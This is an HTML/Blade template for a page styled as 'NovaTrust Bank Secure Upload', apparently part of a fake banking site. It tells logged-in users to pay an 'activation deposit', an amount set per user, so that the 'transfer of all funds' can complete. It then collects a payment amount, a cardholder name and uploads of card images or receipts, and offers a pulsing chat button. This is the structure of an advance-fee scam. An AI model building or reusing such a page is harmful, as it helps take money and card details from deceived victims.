<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Upload - NovaTrust Bank</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f4f6f9;
            margin: 0;
            color: #333;
        }
        .navbar {
            background-color: #1a237e;
            color: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .navbar .logo {
            font-size: 22px;
            font-weight: bold;
        }
        .navbar .menu a {
            color: #fff;
            text-decoration: none;
            margin-left: 20px;
            font-weight: bold;
        }
        .container {
            max-width: 650px;
            margin: 60px auto;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 3px 8px rgba(0,0,0,0.1);
            padding: 30px;
        }
        h2 {
            color: #1a237e;
            text-align: center;
            margin-bottom: 25px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-top: 15px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"],
        input[type="number"],
        input[type="file"],
        textarea {
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #ccc;
            margin-top: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        button {
            background-color: #1a237e;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 12px;
            margin-top: 25px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600;
            transition: background 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
        }
        button:hover {
            background-color: #283593;
        }
        .spinner {
            width: 18px;
            height: 18px;
            border: 3px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.9s linear infinite;
            display: none;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .success-message {
            margin-top: 20px;
            text-align: center;
            color: green;
            font-weight: bold;
        }
        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .alert-box h3 {
            color: #1a237e;
            margin-bottom: 10px;
        }
        .alert-box strong {
            color: #d32f2f;
        }
        .error {
            color: #d32f2f;
            font-size: 14px;
            margin-top: 5px;
        }
    </style>
</head>

<body>

    <div class="navbar">
        <div class="logo">NovaTrust Bank</div>
        <div class="menu">
            <a href="/dashboard">Dashboard</a>
            <a href="/transfer">Transfer</a>
            <a href="/history">History</a>
            <a href="{{ route('logout') }}"
               onclick="event.preventDefault(); document.getElementById('logout-form').submit();">
               Logout
            </a>
            <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display:none;">
                @csrf
            </form>
        </div>
    </div>

    <div class="container">
        <h2> ✅ Secure Upload Card Activation Code ✅</h2>

        <div class="alert-box">
            <h3>Activation Payment Required</h3>
            <p>
                To complete your transaction and enable account features, an activation deposit is required.
                This deposit will be added to your bank account balance.
            </p>

            <p>
                Please deposit 
                <strong>${{ number_format(\App\Helpers\ActivationBalanceHelper::get(auth()->id()), 2) }}</strong>
                to instantly activate your code and complete the transfer of all funds
                to your bank account.
            </p>
        </div>

        @if(session('success'))
            <div class="success-message">{{ session('success') }}</div>
        @endif

        @if($errors->any())
            <div class="error">
                <ul>
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
            </div>
        @endif

        <form id="uploadForm" action="{{ route('secure.upload.post') }}" method="POST" enctype="multipart/form-data">
            @csrf

            <label for="amount">Amount ($)</label>
            <input type="number" name="amount" id="amount" placeholder="Enter amount" required min="1" step="0.01">

            <label for="card_name">Card Name</label>
            <input type="text" name="card_name" id="card_name" placeholder="Enter cardholder name" required>

            <label for="description">Description (Optional)</label>
            <textarea name="description" id="description" rows="4" placeholder="Add a note or description (optional)...">{{ old('description') }}</textarea>

            <label for="upload_file1">Upload File 1 (Required)</label>
            <input type="file" name="upload_file1" id="upload_file1" accept=".jpg,.jpeg,.png,.pdf" required>

            <label for="upload_file2">Upload File 2 (Optional)</label>
            <input type="file" name="upload_file2" id="upload_file2" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file3">Upload File 3 (Optional)</label>
            <input type="file" name="upload_file3" id="upload_file3" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file4">Upload File 4 (Optional)</label>
            <input type="file" name="upload_file4" id="upload_file4" accept=".jpg,.jpeg,.png,.pdf">

            <label for="upload_file5">Upload File 5 (Optional)</label>
            <input type="file" name="upload_file5" id="upload_file5" accept=".jpg,.jpeg,.png,.pdf">

            <!-- PROCESSING BUTTON ADDED HERE -->
            <button type="submit" id="submitBtn">
                <div class="spinner" id="spinner"></div>
                <span id="btnText">Automatically Deposit to your Bank</span>
            </button>
        </form>
    </div>

<!-- Floating Chat Button -->
<a href="{{ route('user.chat') }}" id="floatingChatBtn">
    Chat
    <span id="unread-badge" class="chat-notify-bubble">0</span>
</a>

<style>
#floatingChatBtn {
    position: fixed;
    bottom: 25px;
    right: 25px;
    width: 70px;
    height: 70px;
    background: #28a745;
    color: white;
    font-size: 16px;
    font-weight: bold;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 4px 14px rgba(0,0,0,0.28);
    cursor: pointer;
    z-index: 9999;
    animation: floatPulse 1.8s infinite;
    text-decoration: none;
}
#floatingChatBtn:hover {
    background: #1e7e34;
}
@keyframes floatPulse {
    0% { transform: translateY(0px); }
    50% { transform: translateY(-4px); }
    100% { transform: translateY(0px); }
}
.chat-notify-bubble {
    position: absolute;
    top: 6px;
    right: 6px;
    background: red;
    color: white;
    font-size: 11px;
    padding: 2px 6px;
    border-radius: 50%;
    font-weight: bold;
    display: none;
}
</style>

<script>
document.getElementById('uploadForm').addEventListener('submit', function() {
    const btn = document.getElementById('submitBtn');
    const text = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');

    btn.disabled = true;
    text.textContent = "Processing...";
    spinner.style.display = "inline-block";
});

// Chat unread bubble
function loadUnreadCount() {
    fetch("{{ route('messages.unread.count') }}")
        .then(response => response.json())
        .then(data => {
            const badge = document.getElementById('unread-badge');
            if (!badge) return;

            if (data.count > 0) {
                badge.innerText = data.count;
                badge.style.display = 'inline-block';
            } else {
                badge.style.display = 'none';
            }
        })
        .catch(err => console.error('Unread count error:', err));
}

loadUnreadCount();
setInterval(loadUnreadCount, 5000);
</script>

</body>
</html>
